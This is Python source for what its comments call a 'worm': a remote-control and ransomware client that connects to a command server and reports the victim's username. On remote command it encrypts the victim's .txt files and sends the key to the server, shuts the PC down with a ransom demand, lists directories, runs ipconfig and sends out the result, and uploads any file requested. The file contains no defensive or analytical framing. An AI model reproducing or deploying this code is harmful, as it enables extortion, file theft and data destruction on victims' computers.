#Please don't use this application to commercial purposes.
#In this worm , you can shutdown the victim's pc/ encrypt files/ get victim's pc's directries,ipconfig.

#import libraries.
import socket
import getpass
import os,fnmatch
from cryptography.fernet import Fernet

#Connect to the server.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.10' , 6000))
s.send(("Worm Placed.\n"+"worm cwd: "+os.path.abspath(__file__)+"\nVictim's username: "+getpass.getuser()).encode())

#Encrypt function.
def encrypt(path,key):
    try:    
        f=Fernet(key)  
        file_list=[]
        
        for r,d,fi in os.walk(path):
            for fnm in fi:    
                if fnmatch.fnmatch(fnm,"*.txt"):
                    u=path+'\\'+fnm
                    file_list.append(u)
        
        for path in file_list:                      
            with open(path,"rb") as fle:
                fle_data=fle.read()
            with open("Encrypted_Data.txt","wb") as g:
                g.write(fle_data)
            encrypt_data=f.encrypt(fle_data)
            with open(path,"wb") as fle:
                fle.write(encrypt_data)
        fle.close()
        g.close()
        os.system("attrib +s +h Encrypted_Data.txt")
        #Send comfirmation message to the server.
        s.send(("All files in "+path+" encrypted.").encode())        
    
    except Exception as a:
        s.send(("Encrypt failed.\nError: "+str(a)).encode()) #If an error occured, send the error message to the server.
#Decrypt function.
def decrypt(decrypt_key, pth):
    try:
        decrypt_key=Fernet(decrypt_key)
                
        with open(pth,"rb") as encrypt_file:
            encrypt_data=encrypt_file.read()
        decrypt_data=decrypt_key.decrypt(encrypt_data)
        with open(pth,"wb") as encrypt_file:
            encrypt_file.write(decrypt_data)
        encrypt_file.close()
        s.send(("File decrypted.").encode())
    except Exception as error:
        s.send(str(error).encode())

#Recieve commands and apply them.
while True:    
    msg=s.recv(2000)
    if msg.decode()=="encrypt": #Encrypt victim's data.
        try:
            key=Fernet.generate_key()
            s.send(key)
            path=s.recv(200000)
            path=path.decode()
            encrypt(path,key)      
        except Exception as error:
            s.send(str(error).encode())
    
    elif msg.decode()=="shutdown": #Shutdown victim's pc.
        try:
            os.system("""shutdown /s /t 5 /c "U R Hacked !!!. Send 100$s to this account no. --> XXXXXXXXXXXXXXXXXXXXXX( Your Bank Account no. :-) )" """)
        except Exception as error:
            s.send(str(error).encode())
    
    elif msg.decode()=="cd":  #Go to a vicim's pc's directory
        try:
            pth=(s.recv(2000)).decode()
            out=os.listdir(pth)
            s.send((str(out).encode()))
        except:
            pass
    elif msg.decode()=="ipconfig": #Ipconfig
        try:
            os.system("""ipconfig >> "C:\\info.txt" """)
            with open("C:\\info.txt","rb") as m:
                data=m.read()
            s.send(data)
            m.close()
            os.remove("C;\\info.txt")
        except:
            pass
    elif msg.decode()=="decrypt": #Decrypt
        try:    
            decrypt_key=(s.recv(20000))
            pth=(s.recv(2000)).decode()
            decrypt(decrypt_key, pth)
        except:
            pass
    elif msg.decode()=="open file": #Open file.
        try:    
            path=(s.recv(2000)).decode()
            with open(path,"rb") as fils:
                dt=fils.read()    
            s.send(bytes(dt)) 
        except:
            pass   
    else:
        pass


